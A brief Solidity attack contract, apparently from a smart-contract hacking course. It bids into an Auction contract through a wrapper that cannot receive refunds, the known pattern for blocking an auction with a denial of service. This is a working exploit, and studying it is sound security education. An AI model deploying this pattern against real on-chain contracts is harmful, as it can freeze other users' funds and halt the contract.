// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

interface Auction {
    function bid() external payable;
}

contract Attack {

    Auction auction;
    address private owner;

    constructor(address _auction) {
        auction = Auction(_auction);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner);
        auction.bid{value: msg.value}();
    }

}